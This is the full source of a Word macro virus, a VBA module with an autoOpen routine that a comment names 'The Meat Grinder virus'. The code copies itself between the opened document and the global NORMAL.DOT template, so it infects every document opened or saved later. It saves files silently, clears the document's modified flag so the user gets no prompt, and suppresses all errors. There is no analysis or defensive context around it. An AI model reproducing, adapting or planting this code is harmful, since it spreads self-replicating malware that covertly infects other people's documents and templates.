   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True

   Attribute VB_Name = "autoOpen"

   Public Sub MAIN()
   Dim TheSmallOne$
   Dim TheBigOne$
   Dim ThisOne$
   Dim SmallFileAtt
       On Error GoTo -1: On Error GoTo jane

       'The Meat Grinder virus - Thanks to Kermit the Frog,
       ' and Kermit the Protocol

       TheSmallOne$ = WordBasic.[FileName$]() + ":autoOpen"

       TheBigOne$ = "Global:autoOpen"
       ThisOne$ = UCase(WordBasic.[Right$](WordBasic.[MacroFileName$](WordBasic.[MacroName$](0)), 10))

       If ThisOne$ = "NORMAL.DOT" Then
           SmallFileAtt = GetAttr(WordBasic.[FileName$]())
           If SmallFileAtt >= 32 Then SmallFileAtt = SmallFileAtt - 32
           If SmallFileAtt >= 4 Then SmallFileAtt = SmallFileAtt - 4
           If SmallFileAtt >= 2 Then SmallFileAtt = SmallFileAtt - 2
           If SmallFileAtt = 0 Then

               WordBasic.MacroCopy TheBigOne$, TheSmallOne$
               WordBasic.FileSaveAs Format:=1
               WordBasic.SetDocumentDirty 0
           End If
       Else
           WordBasic.MacroCopy TheSmallOne$, TheBigOne$
       End If

   GoTo oughta_here

   jane:

   oughta_here:
       On Error GoTo -1: On Error GoTo 0


   End Sub
